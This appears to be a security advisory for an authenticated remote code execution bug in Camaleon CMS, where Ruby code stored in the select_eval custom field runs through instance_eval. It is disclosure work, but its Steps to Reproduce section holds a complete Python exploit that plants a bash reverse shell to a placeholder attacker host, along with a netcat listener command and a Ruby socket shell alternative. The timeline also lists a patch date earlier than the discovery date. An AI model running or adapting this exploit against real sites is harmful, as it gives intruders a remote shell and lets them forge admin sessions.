# Security Advisory: Camaleon CMS - Authenticated RCE via `select_eval` Custom Field

**Assigned CVE ID:** CVE-2026-66748

**Product:** Camaleon CMS (https://github.com/owen2345/camaleon-cms)
**Affected versions:** 2.1.1 – 2.9.1 (introduced commit 415cbda6 2015-10-16; fixed commit 15882366 2026-03-29 / v2.9.2)
**Severity:** High
**CVSS 4.0 Score:** 8.7
**CVSS 4.0 Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L
**CWE:** CWE-94 (Code Injection)
**Researcher:** Theodosis Paidakis
**Vendor notified:** 2026-06-21
**Related advisory:** GHSL-2024-185 / GHSA-7x4w-cj9r-h4v9 (`label_eval` - parallel field type, same root cause, no CVE assigned)

## Summary

The `select_eval` custom field type stores an arbitrary Ruby expression in `field.options[:command]` and executes it via `instance_eval` in an ERB view whenever a post edit page is rendered. Pre-v2.9.2, any user with the `custom_fields` manage permission - commonly granted to editor-role accounts - could create this field type and achieve server-side RCE. A `select_eval` field fires on every page render of any post using the field group; its output becomes the dropdown options list. The vulnerability was patched in v2.9.2.

## Affected Component

**File:** `app/views/camaleon_cms/admin/settings/custom_fields/fields/_select_eval.html.erb`

```erb
<%= select_tag "#{field_name}[#{field.slug}][values][]",
      instance_eval(field.options[:command].to_s.strip),
      class: "..." %>
```

`instance_eval` is called with the raw string from the database record. No sandboxing and no compile-time restriction on what methods or constants are accessible from the ERB binding (which is a full Rails view context).

**File:** `app/models/camaleon_cms/ability.rb` (v2.9.1, lines 161-165)

`custom_fields` is never granted explicitly. Eight resources get `can :manage` individually further up the file (`media`, `comments`, `themes`, `widgets`, `nav_menu`, `plugins`, `users`, `settings`), and `custom_fields` is not one of them. It is reachable only through this catch-all, which hands `manage` to any key present in the role's `@roles_manager` hash without checking whether that key is safe to grant:

```ruby
@roles_manager.try(:each) do |rol_manage_key, val_role|
  can :manage, rol_manage_key.to_sym if val_role.to_s.cama_true?
rescue StandardError
  false
end
```

Any user whose role has the `custom_fields` bit set therefore reaches the custom fields controller. In the affected range that bit is routinely granted to editor-level roles.

The v2.9.2 rewrite replaces `can` with a `safe_can` wrapper and adds an explicit `%i[...]` list containing both `custom_fields` and `select_eval`, but the catch-all loop above still exists in that version. The permission list is not what fixes this issue; the strong-parameters allowlist in `custom_fields_controller.rb` and the `can?(:manage, :select_eval)` gate in `custom_field_group.rb` are.

## Root Cause Analysis

The `select_eval` field type was designed to let developers dynamically populate select dropdowns from Ruby code stored in the CMS database. Executing arbitrary Ruby from a database column via `instance_eval` is equivalent to granting shell access to anyone who can write that value. The permission requirement was `custom_fields` - a routine content-management permission - rather than an explicit privileged bit.

## Relation to Prior Advisories

This finding was published GHSL-2024-185 / GHSA-7x4w-cj9r-h4v9 covering a parallel `label_eval` field type in Camaleon CMS. That advisory was part of a batch of five findings (GHSL-2024-182 through GHSL-2024-186); only two of the five received CVE numbers (CVE-2024-46986 and CVE-2024-46987). GHSL-2024-185 itself has no assigned CVE.

`select_eval` and `label_eval` share the same root cause - arbitrary Ruby stored in the database executed via `instance_eval` in an ERB view - but are distinct in every other dimension:

|                | `label_eval` (GHSL-2024-185) | `select_eval` (this report)        |
| -------------- | ---------------------------- | ---------------------------------- |
| Execution site | Field label in any form      | `select_tag` in post edit page     |
| Write path     | Custom field label text      | `field.options[:command]` meta row |

This report covers `select_eval` exclusively. No existing CVE or public advisory documents this specific field type and its exploitation path.

## Steps to Reproduce

The affected range v2.1.1 to v2.9.1 was determined by source analysis; exploitation was confirmed end to end on v2.9.1. Requires only an account with `custom_fields` permission - no server access.

**Prerequisites:** Any account with the `custom_fields` manage bit set - a standard editor-role permission in the affected range.

**Step 1.** Start a listener:

```bash
nc -lnvp 4444
```

**Step 2.** Run the script. Edit `BASE`, `ATTACKER_IP`, `TYPE_ID`, `POST_ID`, and credentials.

`TYPE_ID` - post type ID visible in the admin sidebar URL (e.g. `/admin/post_type/2/posts`).
`POST_ID` - any post ID under that type, from the post list edit links.

```python
import requests, re, time

BASE        = "http://target.example"
ATTACKER_IP = "ATTACKER_IP"
PORT        = 4444
TYPE_ID     = 2    # post type ID - from admin sidebar URL
POST_ID     = 1    # any post under that type - from post list edit links
USERNAME    = "editor"       # any account with custom_fields manage permission
PASSWORD    = "Editor1234!"

# Reverse shell. Thread.new keeps the page render from hanging.
# Payload strings must use double quotes so #{ } interpolation executes inside instance_eval.
PAYLOAD = f'[["ok","ok"]].tap{{Thread.new{{system("bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1")}}}}'
# No-bash alternative (pure Ruby sockets, cross-platform):
# PAYLOAD = f'[["ok","ok"]].tap{{Thread.new{{require "socket";s=TCPSocket.open("{ATTACKER_IP}",{PORT});loop{{cmd=s.gets.chomp;s.puts(`#{{cmd}}`)}}}}}}' 
# Proof-of-concept (non-destructive - id/hostname appear in select dropdown on the edit page):
# PAYLOAD = '[["id: #{`id`.strip}", "v"], ["host: #{`hostname`.strip}", "h"]]'

s = requests.Session()

r    = s.get(f"{BASE}/admin/login")
csrf = re.search(r'authenticity_token" value="([^"]+)"', r.text).group(1)
s.post(f"{BASE}/admin/login", data={
    "authenticity_token": csrf,
    "user[username]": USERNAME,
    "user[password]": PASSWORD,
})
r    = s.get(f"{BASE}/admin/dashboard")
csrf = re.search(r'csrf-token" content="([^"]+)"', r.text).group(1)

idx = f"x{int(time.time())}"
r = s.post(f"{BASE}/admin/settings/custom_fields", data={
    "authenticity_token":               csrf,
    "custom_field_group[name]":         f"exploit_{idx}",
    "custom_field_group[assign_group]": f"PostType_Post,{TYPE_ID}",  # must be PostType_Post, not PostType
    f"fields[{idx}][name]":             "Shell",
    f"fields[{idx}][slug]":             f"rce_{idx}",
    f"field_options[{idx}][field_key]": "select_eval",
    f"field_options[{idx}][command]":   PAYLOAD,   # permit! passes this through unfiltered pre-v2.9.2
}, allow_redirects=True)

gid = re.search(r'/custom_fields/(\d+)', r.url)
print(f"Field group: id={gid.group(1) if gid else '?'} (HTTP {r.status_code})")

# Trigger: instance_eval fires when the edit form renders the select_eval field
r = s.get(f"{BASE}/admin/post_type/{TYPE_ID}/posts/{POST_ID}/edit")
print(f"Edit page: HTTP {r.status_code} - check listener")
```

<img width="2226" height="592" alt="image" src="https://github.com/user-attachments/assets/47be29a3-1a2f-4591-901a-46c8cc2415ad" />

## Impact

Any account with `custom_fields` permission (pre-v2.9.2) gains:

- **Arbitrary Ruby execution** in the Rails process, with the privileges of the web server user (`deploy`, `www-data`, `rails`, etc.)
- **Persistent execution**: the payload fires on every page render of every post using the field group - not a one-shot exploit
- **Session forgery**: reading `secret_key_base` from `config/secrets.yml` allows forging arbitrary session cookies for any user including admins
- **Multi-site impact**: on a shared Camaleon instance, the Rails process has access to all sites' data

Pre-v2.9.2, the `custom_fields` permission was routinely granted to editor-role users. An attacker who compromises any editor-level account achieves full server-side RCE.

## Timeline

**2026-06-19** - Discovered during source analysis of v2.9.2 and v2.9.1
**2026-06-21** - Vendor notified
**2026-03-29** - Patch already released (v2.9.2, commit 15882366)
